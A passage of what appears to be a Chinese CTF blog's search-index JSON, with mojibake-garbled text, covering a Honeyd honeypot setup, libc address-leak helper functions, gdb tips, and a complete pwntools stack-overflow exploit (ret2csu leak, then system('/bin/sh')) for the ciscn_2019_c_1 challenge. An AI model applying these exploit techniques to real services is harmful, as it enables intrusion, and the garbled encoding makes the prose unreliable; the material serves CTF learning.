\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"èœœç½æ­å»º","url":"/2021/08/14/èœœç½æ­å»º/","content":"\nç¯å¢ƒï¼šè™šæ‹Ÿæœºubuntu18.04ã€‚\n\n1.å®‰è£…å‰ç½®ä¾èµ–ï¼š\n\n```\nsudo apt-get install g++ gcc\nsudo apt-get install flex\nsudo apt-get install bison\nsudo apt-get install libedit-dev\n```\n\n2.ä¸‹è½½å‰ç½®å·¥å…·ï¼š\n\n```\n#æ³¨é‡Šå¤´\nlibevent-1.4.14b-stable.tar.gz   \nlibdnet-1.11.tar.gz              \nlibpcap-1.1.1.tar.gz             \narpd-0.2.tar.gz\n#æ³¨é‡Šå¤´\n\nhttp://libevent.org/\nhttp://libdnet.sourceforge.net/\nhttp://www.tcpdump.org/release/\nhttp://www.citi.umich.edu/u/provos/honeyd\n```\n\n3.å®‰è£…å·¥å…·ï¼šåŸºæœ¬éƒ½æ˜¯ç¼–è¯‘ä¸‰éƒ¨æ›²\n\n(1)å®‰è£…Libevent(éåŒæ­¥äº‹ä»¶é€šçŸ¥çš„å‡½æ•°åº“)ï¼šä½¿ç”¨libeventï¼Œå¯ä»¥è®¾å®šæŸäº›äº‹ä»¶å‘ç”Ÿæ—¶æ‰€æ‰§è¡Œçš„å‡½æ•°ï¼Œç”¨æ¥ä»£æ›¿ç¨‹åºæ‰€ä½¿ç”¨çš„å¾ªç¯æ£€æŸ¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libevent-1.4.14b-stable.tar.gz\ncd libevent-1.4.14b-stable\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(2)å®‰è£…Libdnet(æä¾›è·¨å¹³å°çš„ç½‘ç»œç›¸å…³çš„APIå‡½æ•°åº“)ï¼šåŒ…æ‹¬äº†ARPç¼“å­˜ï¼Œè·¯ç”±è¡¨æŸ¥è¯¢ï¼ŒIPåŒ…åŠç‰©ç†å¸§çš„ä¼ è¾“ç­‰ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libdnet-1.11.tar.gz\ncd libdnet-1.11\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(3)å®‰è£…Libpcapï¼šä¸€ä¸ªæ•°æ®åŒ…æ•è·å‡½æ•°åº“ï¼Œå¤§å¤šæ•°ç½‘ç»œè½¯ä»¶éƒ½ä»¥å®ƒä¸ºåŸºç¡€\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf libpcap-1.1.1.tar.gz\ncd libpcap-1.1.1\nsudo ./configure\nsudo make\nsudo make install\n```\n\nä¹‹å‰è£…çš„ä¾èµ– flex bisonå°±æ˜¯ä¸ºäº†è¿™ä¸ªã€‚\n\n(4)å®‰è£…ARPDï¼ˆè¿è¡Œåœ¨ä¸Honeydç›¸åŒçš„ç³»ç»Ÿä¸Šï¼‰ï¼šarpdæ˜¯honeydä¼—å¤šåä½œå·¥å…·ä¸­æœ€é‡è¦çš„ä¸€ä¸ªå·¥å…·ã€‚å·¥ä½œæ—¶ç›‘å¬å±€åŸŸç½‘å†…çš„æµé‡ï¼Œå¹¶é€šè¿‡æŸ¥çœ‹honeydç³»ç»Ÿçš„ARPè¡¨åˆ¤æ–­å…¶ä»–ç³»ç»Ÿæ˜¯å¦å­˜æ´»ã€‚åœ¨èœœç½ç³»ç»Ÿä¸­arpdå¯ä»¥æŒ‡å®šIPåœ°å€ï¼Œå°†è¯¥ç³»ç»Ÿä¸‹çš„MACåœ°å€ä¼ªè£…æˆæŒ‡å®šIPçš„MACåœ°å€ï¼Œè¿™æ ·å¯¹æŒ‡å®šIPåœ°å€èŒƒå›´å†…æœªä½¿ç”¨çš„IPçš„è¿æ¥è®¿é—®éƒ½è¢«é‡å®šå‘åˆ°èœœç½ä¸»æœºï¼Œç„¶åå¯¹èœœç½ä¸»æœºè¿›è¡Œç›¸å…³çš„è®¾ç½®ï¼Œå°±å¯ä»¥è¯±å¯¼æ”»å‡»ï¼Œæˆªå–æµé‡ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf arpd-0.2.tar.gz\ncd arpd-0.2\nsudo ./configure\n#æŠ¥é”™ï¼šerrorï¼šexpectedâ€™)â€™ before string constant\n#è§£å†³ï¼šåœ¨arpd.cæ–‡ä»¶ä¸­æ·»åŠ #define __FUNCTION__ \"\" #vim arpd.cæ·»åŠ å®šä¹‰\nsudo make\nsudo make install\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452811.png)\n\n4.å®‰è£…èœœç½å·¥å…·Honeydï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo tar -zxvf honeyd-1.5c.tar.gz\ncd honeyd-1.5c\nsudo ./configure\n#æŠ¥é”™ï¼šconfigure: error: Couldn't figure out how to access libc\n#è§£å†³ï¼šsudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so\nsudo make\nsudo make install\n```\n\n5.å…ˆå°†arpdè¿è¡Œèµ·æ¥ï¼š\n\n(1)è¿è¡Œåæ˜¾ç¤ºé“¾æ¥ä¸å­˜åœ¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452140.png)\n\n(2)è§£å†³åŠæ³•ï¼šæ‰¾åˆ°libevent-1.4.so.2çš„ä½ç½®ï¼Œç„¶åå°†ä½ç½®åŠ åˆ°å®šä½çš„æ–‡ä»¶ä¸­\n\nwhereis libevent-1.4.so.2\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452134.png)\n\nsudo vim /etc/ld.so.conf\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452265.png)\n\nsudo ldconfig #é‡æ–°åŠ è½½é“¾æ¥\n\n(3)ä¹‹åé€‰å®šç½‘å¡ï¼Œå³å¯æ¨¡æ‹ŸIPï¼Œä¼ªè£…IPçš„MACåœ°å€\n\nsudo arpd -i ens33 192.168.1.71\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452193.png)\n\nâ–²è¿™é‡Œçš„ens33æ˜¯ubuntuä¸‹ç”¨ip addræŸ¥åˆ°çš„ï¼Œä¸åŒç³»ç»Ÿå¯èƒ½ä¸åŒã€‚\n\n6.æ£€æµ‹Honeydæ˜¯å¦å¯ä»¥è¿è¡Œï¼š\n\n(1)è®¾ç½®å¯åŠ¨å‚æ•°vim honeyd.confï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n# Example of a simple host template and its binding\ncreate windows\n\n#åˆ›å»ºä¸€ä¸ªwindows xpç³»ç»Ÿçš„èœœç½\nset windows personality \"Microsoft Windows XP Professional SP1\"\n\n#å¼€å¯80ç«¯å£webæœåŠ¡ä¸”ä¾¦å¬è„šæœ¬ä¸ºhoneyd-1.5c/scripts/web.sh\nadd windows tcp port 80 \"sh /home/hacker/Desktop/Web/Honey/honeyd-    1.5c/scripts/web.sh\"\n\n#å…³é—­é»˜è®¤çš„tcp,udpè¿æ¥\nset windows default tcp action reset\nset windows default udp action reset\n\n#å°†windowsè¿™ä¸ªèœœç½çš„ipç»‘å®šä¸º192.168.40.150\nbind 192.168.40.150 windows\n```\n\nâ–²æ³¨æ„è¿™é‡Œé¢è®¾ç½®çš„IPæ˜¯åœ¨å±€åŸŸç½‘ä¸‹çš„ï¼Œä¸”è¿˜æ²¡æœ‰è¢«DHCPåˆ†é…å‡ºå»çš„å¯ç”¨IPã€‚åŒæ—¶è®¾ç½®äº†è¯¥IPä¸»æœºä¸‹çš„80ç«¯å£ï¼Œè¿™æ ·å…¶ä»–ç”¨æˆ·åœ¨è®¿é—®è¯¥IPçš„80ç«¯å£æ—¶å°±ä¼šè¿è¡Œ(Webè®¿é—®)\n\nsh /home/hacker/Desktop/Web/Honey/honeyd- 1.5c/scripts/web.sh\n\nè¿™æ¡å‘½ä»¤ï¼Œç„¶åè¿”å›ç›¸åº”çš„ä¿¡æ¯ã€‚\n\n(2)è®¾ç½®web.shè„šæœ¬(è¿™å¯ä»¥éšä¾¿è®¾ç½®ï¼Œåˆ¶ä½œä¸€ä¸ªwebå‰ç«¯å³å¯ï¼Œå¸¸ç”¨æ¥é’“é±¼)ï¼Œåœ¨honeyd.confä¸­è®¾ç½®è·¯å¾„ï¼šåœ¨scriptsä¸‹åŸæœ¬å­˜åœ¨ä¸€ä¸ªè‡ªå¸¦çš„è„šæœ¬ï¼Œè¯¥è„šæœ¬è¢«å…¶ä»–äººè®¿é—®è¿è¡ŒæˆåŠŸåå‘ˆç°å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452534.png)\n\n(3)å¯åŠ¨èœœç½honeydï¼š\n\nhoneyd -d -f honeyd.conf 192.168.1.2\n\nâ–²è¿™æ ·ä¸€ä¸ªèœœç½å°±æ­å»ºèµ·æ¥äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ­å»ºæ­¥éª¤å¤§æ¦‚åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\n\nâ‘ åˆ©ç”¨arpdè™šæ‹ŸIPã€‚\n\nâ‘¡åœ¨honeyçš„å¯åŠ¨å‚æ•°ä¸­ï¼Œä¹Ÿå°±æ˜¯honey.confä¸­ç»‘å®šè™šæ‹Ÿçš„ä¸»æœºåˆ°è™šæ‹ŸIPã€‚\n\nâ‘¢åœ¨honey.confä¸­è®¾ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³ç«¯å£ï¼Œåè®®ç­‰å‚æ•°ã€‚\n\nâ‘£è®¾ç½®ç«¯å£è¿æ¥åçš„è¿”å›ä¿¡æ¯ï¼Œç±»ä¼¼äº80ç«¯å£çš„web.shï¼Œæˆ–è€…sshè¿æ¥ç«¯å£çš„é¡µé¢ç­‰ç­‰ã€‚\n\nâ‘¤å¯åŠ¨honeyï¼Œç­‰å¾…é±¼å„¿ä¸Šé’©ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/2019/12/17/5df842503e7a9/\n\nhttps://blog.csdn.net/accepthjp/article/details/46399715\n\nhttps://blog.csdn.net/zhangxuechao_/article/details/80261502\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"é€šè¿‡æ ˆæº¢å‡ºè·å–libcåœ°å€æ±‡æ€»","url":"/2021/08/14/é€šè¿‡æ ˆæº¢å‡ºè·å–libcåœ°å€æ±‡æ€»/","content":"\n# ä¸€ã€ä½¿ç”¨LibcSearch\n\n \n\n# äºŒã€ä½¿ç”¨DynELFæ¥æ³„éœ²ï¼š\n\n## 1.ä½¿ç”¨writeå‡½æ•°\n\nä¸‰ä¸ªå‚æ•°å¸ƒå±€\n\nâ˜…32ä½ç¨‹åºï¼šç›´æ¥åœ¨æ ˆä¸Šç»™å‡ºå‚æ•°\n\nç›´æ¥è®©writeè¿”å›åˆ°startå‡½æ•°åˆå§‹åŒ–ç¨‹åº(å¤šç”¨äºæ ˆæº¢å‡ºå­—èŠ‚æ•°è¾ƒå°‘)\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n#io.recv(),çœ‹å…·ä½“æƒ…å†µæ˜¯å¦è¦å…ˆæ¥æ”¶\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #è°ƒç”¨write\n    payload += p32(start_addr) #writeè¿”å›åˆ°startï¼Œæ¢å¤æ ˆ\n    payload += p32(1) #writeç¬¬ä¸€ä¸ªå‚æ•°fd\n    payload += p32(addr) #writeç¬¬äºŒä¸ªå‚æ•°buf\n    payload += p32(8) #writeç¬¬ä¸‰ä¸ªå‚æ•°size\n    io.sendline(payload)\n    data = io.recv()[:8] #æ¥å—å†…å®¹è¯»å–é€šè¿‡writeæ‰“å°çš„åœ°å€\n    print(\"%#x -> %s\" %(addr, (data or '').encode('hex')))\n    #è¿™é‡Œæ‰“å°ä¸éœ€è¦ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯å¯ä»¥æ‰“å°å‡ºæ¥è®©æˆ‘ä»¬çœ‹åˆ°writeæ‰“å°äº†ä»€ä¹ˆåœ° å€ï¼ŒåŸºæœ¬éƒ½æ‰“å°äº†\n    return data\n    #è¿™é‡Œreturnçš„dataæœ‰å¾ˆå¤šåœ°å€ï¼Œéœ€è¦é€šè¿‡ä¹‹åçš„DynELFæ¥lookupå¯¹åº”çš„ åœ°å€\n```\n\nâ˜…64ä½ç¨‹åºï¼šåˆ©ç”¨ä¸‡èƒ½gadgetæ¥èµ‹äºˆå‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    #print p.recv()ï¼Œçœ‹å…·ä½“æƒ…å†µæ˜¯å¦è¦å…ˆæ¥æ”¶\n    payload = \"A\" * 24\n    payload += p64(pop6_addr) #ä¸‡èƒ½gadget1\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(write_got_addr) #æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨pltè¡¨\n    payload += p64(8)\n    payload += p64(addr)\n    payload += p64(1)#writeçš„å‚æ•°fdï¼Œ1ä»£è¡¨stdoutæ ‡å‡†è¾“å‡º\n    payload += p64(mov_call_addr) #ä¸‡èƒ½gadget2\n    payload += \"A\" * 56\n    #paddingè¿‡æ‰ä¸‡èƒ½gadget2çš„åˆ¤æ–­è¯­å¥ï¼Œæ¥ä¸Šä¸‡èƒ½gadget1ï¼Œç”¨æ¥å¡«å……æ ˆ\n    payload += p64(startAddress)#è·³è½¬startï¼Œæ¢å¤æ ˆ\n    p.send(payload)\n    data = p.recv(4)\n    print (\"%#x => %s\" % (address, (data or '').encode('hex'))\n    return data\n```\n\n## 2.ä½¿ç”¨putå‡½æ•°ï¼š\n\nä¸€ä¸ªå‚æ•°å¸ƒå±€\n\nputså‡½æ•°æ¯”è¾ƒå¥½è°ƒç”¨ï¼Œ32ä½ä¸‹ç›´æ¥åœ¨æ ˆä¸Šå¸ƒå±€å°±å¥½ï¼Œ64ä½ä¸‹ç”¨ä¸€ä¸ªpop rdiå°±å®Œäº‹ã€‚\n\nputsçš„åŸå‹æ˜¯puts(addr)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°â€œ\\x00â€å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œputså‡½æ•°è¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯ä¸å—æ§çš„ï¼Œåªè¦æˆ‘ä»¬è¾“å‡ºçš„ä¿¡æ¯ä¸­åŒ…å«\\x00æˆªæ–­ç¬¦ï¼Œè¾“å‡ºå°±ä¼šç»ˆæ­¢ï¼Œä¸”ä¼šè‡ªåŠ¨å°†\"\\n\"è¿½åŠ åˆ°è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œæ‰€ä»¥è¿™é‡Œå°±éœ€è¦é’ˆå¯¹leakå‡½æ•°åšç‰¹æ®Šå¤„ç†ã€‚ä½†ç»“æŸä¸å¤ªå¥½åˆ¤æ–­ï¼Œå¦‚æœåªç”¨\\næ¥åˆ¤æ–­ï¼Œé‚£ä¹ˆå¦‚æœéœ€è¦æ³„éœ²çš„åœ°å€æœ€åä¸¤ä¸ªå­—èŠ‚ä¸­çš„æœ‰æ•ˆä½ä¸­å¸¦æœ‰\\n(0x0a)ï¼Œé‚£åŒæ ·ä¼šæˆªæ–­ï¼Œå¯¼è‡´æ— æ³•å®Œå…¨è¾“å‡ºã€‚æ‰€ä»¥è¿™é‡Œç”¨\\nå’Œtimeoutæ¥åˆ¤æ–­ï¼Œå½“ç»“æŸå­—ç¬¦\\nå‡ºç°ï¼Œå¹¶ä¸”è®¾ç½®è¶…æ—¶æœºåˆ¶ï¼Œå‡ºç°ç»“æŸå­—ç¬¦å¹¶ä¸”æ²¡æœ‰ä¸œè¥¿å†è¾“å‡ºäº†ï¼Œé‚£å°±ä»£è¡¨æ˜¯çœŸçš„ç»“æŸäº†ã€‚ç”±äºæ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å¤„ç†ï¼Œæ‰€ä»¥å¦‚æœputså‡½æ•°è¾“å‡ºå®Œåè¿˜æœ‰å…¶å®ƒçš„è¾“å‡ºï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•çŸ¥é“0x0aåˆ°åº•æ˜¯putè¾“å‡ºçš„è¿˜æ˜¯ä¹‹åçš„è¾“å‡ºå‡½æ•°è¾“å‡ºçš„ï¼Œè¿™é‡Œä¸»è¦è®¨è®ºåœ¨è¿™ä¸¤ç§æƒ…å†µï¼š\n\n(è¿™é‡Œä¹Ÿæ˜¯å› ä¸ºTCPæ¡æ‰‹åŸå› ï¼ŒTCPä¼ è¾“æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ä¼ è¾“çš„)\n\nâ˜…putsè¾“å‡ºå®Œåæ²¡æœ‰å…¶å®ƒè¾“å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º\n    up = \"\"\n    while True:\n    #ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…0.1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°    äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†\n    #è¿™é‡Œä¸ºäº†ä¸ä¸æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚è¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€\n        c = p.recv(numb=1, timeout=0.1)\n        count += 1\n        if up == '\\n' and c == \"\":  \n        #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™\n           buf = buf[:-1] #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦\n           buf += \"x00\"\n           break\n        else:\n           buf += c\n           up = c\n    data = buf[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\nâ˜…putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶å®ƒè¾“å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º\n    up = \"\"\n    while True:\n    #ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†\n    #ä¸ä¸æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œè¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€\n    c = p.recv(numb=1, timeout=1)\n    count += 1\n    if up == 'n' and c == \"X\":  \n    #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œä¸‹ä¸€ä¸ªå­—ç¬¦å¼€å¤´æ˜¯Xï¼Œé‚£å°±ç»“æŸè¾“å‡ºã€‚\n        buf = buf[:-1]             #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦\n        buf += \"x00\"\n        break\n    else:\n        buf += c\n        up = c\n    data = buf[:4]  #ä»putè¾“å‡ºå¼€å¤´å–æŒ‡å®šå­—èŠ‚æ•°\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\nâ–²ä½¿ç”¨printfå‡½æ•°ï¼šæ²¡æ‰¾åˆ°å…·ä½“ç‚¹çš„ï¼Œä½†åº”è¯¥å’Œputså‡½æ•°å·®ä¸å¤šï¼Œä»¥åé‡åˆ°å†è¯´ã€‚å·²çŸ¥ï¼š\n\né‡åˆ°\\x00å’Œ\\x0aä¼šæˆªæ–­ï¼Œç„¶åæ‰“å°çš„æ—¶å€™ä¸ä¼šæ‰“å°\\x00å’Œ\\x0a\n\n \n\n# ä¸‰ã€é‡è¦æ³¨æ„äº‹é¡¹ï¼š\n\næ³¨æ„ç¨‹åºçš„è¾“å…¥å‡½æ•°æ˜¯ä»€ä¹ˆï¼Œæœ‰äº›é¢˜çš„è¾“å…¥å‡½æ•°æ˜¯scanfï¼Œé‚£ä¹ˆå°±ä¸æ”¯æŒè¯»å…¥ç©ºæ ¼ï¼Œæ¢è¡Œç¬¦ï¼Œåˆ¶è¡¨ç¬¦ï¼Œè½¬æ¢æˆasciiç å°±æ˜¯ï¼š0x20ï¼Œ0x0aï¼Œ0x09ï¼Œ0x00,æ‰€ä»¥å½“ä¼ æ•°æ®çš„æ—¶å€™æœ‰è¿™äº›çš„æ—¶å€™éœ€è¦æ³¨æ„ã€‚æ›´å¤šæŸ¥èµ„æ–™æˆ–è€…è°ƒè¯•ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.anquanke.com/post/id/85129\n\n \n\n \n","tags":["pwn-knowledge"],"categories":["PWN"]},{"title":"è°ƒè¯•å¸¸ç”¨éªšæ“ä½œ","url":"/2021/08/14/è°ƒè¯•å¸¸ç”¨éªšæ“ä½œ/","content":"\n## 1.æŸ¥çœ‹æ•°æ®\n\n- æŸ¥çœ‹å¯èƒ½ç”¨åˆ°çš„å˜é‡æˆ–å‡½æ•°åœ°å€ï¼š`magic`\n\n- æŸ¥çœ‹æŒ‡å®šåœ°æ–¹åœ°å€æˆ–å€¼ï¼š\n\n  ```\n  #æ³¨é‡Šå¤´\n  \n  p &__malloc_hook\n  p *__malloc_hook\n  p __malloc_hook\n  p main_arena.bins[0]\n  p main_arena.fastbinsY\n  ```\n\n- æŸ¥çœ‹å †çŠ¶æ€å†…å®¹ï¼š\n\n  ```\n  heap; vis; parseheap; bins;\n  ```\n\n- æŸ¥çœ‹å‡½æ•°æ±‡ç¼–ä»£ç ï¼š`x/20i &__libc_realloc`\n\n- æŸ¥çœ‹è°ƒç”¨çš„å‡½æ•°ï¼š`backtrace`ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰ä½ç½®è°ƒç”¨çš„ç›¸å…³å †æ ˆåŠå‡½æ•°\n\n\n\n## 2.æŠ€å·§\n\n- ç›´æ¥ä»Libc.soä¸­æŸ¥æ‰¾å‡½æ•°ï¼š\n\n  ```\n  readelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep -E \"__malloc_hook|__free_hook|__realloc_hook\"\n  ```\n\n- ç»“æ„ä½“çš„size\n\n  ```\n  p sizeof((*(struct msg_queue*)0xffffffff82203e90))\n  ```\n\n- libsï¼šç±»ä¼¼IDAä¸­çš„ctrl+s\n\n\n\n## 3.æ–­ç‚¹\n\n- ç¡¬ä»¶æ–­ç‚¹ï¼š`watch/awatch/rwatch *addr`å†…å­˜ç¡¬ä»¶æ–­ç‚¹ï¼Œåˆ†åˆ«å¯¹åº”å†™/è¯»å†™/è¯»ã€‚\n\n\n\n## 4.å¤šçº¿ç¨‹\n\n- æŸ¥çœ‹çº¿ç¨‹ï¼š`i threads`\n\n  ![image-20220425194911990](https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220425194911990.png)\n\n- åˆ‡æ¢çº¿ç¨‹ï¼š`thread x`ï¼Œè¿™ä¸ªxå°±æ¯”å¦‚æ˜¯ä¸Šè¿°3ä¸ªçº¿ç¨‹ä¸­çš„æŸä¸ªçº¿ç¨‹ã€‚`pwndbg`ä¸­å¯ä»¥å®Œç¾åˆ‡æ¢ï¼Œå¹¶ä¸”å †æ–¹é¢ä¹Ÿå¯ä»¥ã€‚\n\n\n\n","tags":["è°ƒè¯•"],"categories":["PWN"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•1","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•1/","content":"\n1.ciscn_2019_c_1ï¼šæ ˆæº¢å‡ºï¼Œè°ƒç”¨æ‰“å°å‡½æ•°æ³„éœ²åœ°å€ï¼Œä¸‡èƒ½gadgetï¼ŒROPã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_c_1\"\n#libc.so = \"./libc-2.24.so\"\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nrl = lambda :io.recvline()\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28337\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmenu = \"choice!\\n\"\npop_rdi=0x400c83\nret=0x4006b9\nmain=elf.sym['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nencrypt_addr = 0x4009A0\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\nlog.info(\"u_gadget1:0x%x\"%u_gadget1)\nlog.info(\"u_gadget2:0x%x\"%u_gadget2)\n\npayload = \"\"\npayload += \"\\x00\"\npayload = payload.ljust(0x58,'A')\npayload += p64(u_gadget1) #ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨putsæ³„éœ²åœ°å€\npayload += p64(0x0)\npayload += p64(0x1) #rbpï¼Œéšä¾¿è®¾ç½®\npayload += p64(puts_got)\npayload += p64(0x8)\npayload += p64(puts_got) #ä»è¯¥gotè¡¨æ³„éœ²åœ°å€\npayload += p64(puts_got)\npayload += p64(u_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\npayload += p64(encrypt_addr)\n#è¿”å›åˆ°functionå¤„ï¼Œé€šå¸¸è¿”å›ç¨‹åºæœ€å¼€å§‹æ¥é‡æ–°è¿è¡Œç¨‹åºå¥½å†è¿›è¡Œå¸ƒç½®\n\n#payload='\\0'+'a'*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\n\nru(menu)\nsl('1')\nsl(payload)\nru('Ciphertext\\n')\nru('\\n')\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts:0x%x\"%u_gadget2)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload='\\x00'+'a'*(0x50-1+8)+ p64(ret) + p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)\n\nsl(payload)\np.interactive()\n```\n\n2.ciscn_2019_es_2ï¼š32ä½æ ˆæº¢å‡ºï¼Œæº¢å‡ºé•¿åº¦ä¸å¤Ÿã€‚æ³„éœ²æ ˆåœ°å€ï¼Œç”¨ebpå°†æ ˆè¿ç§»åˆ°ä¸Šå±‚å‡½æ•°çš„æ ˆä¸­ï¼Œåˆ©ç”¨ä¸Šå±‚å‡½æ•°ä½™ä¸‹çš„æ±‡ç¼–ä»£ç å®ç°å¸¸è§„çš„æ ˆæº¢å‡ºæ“ä½œsystem+binshæ¥getshellï¼š\n\n```python\n# -*- coding:UTF-8 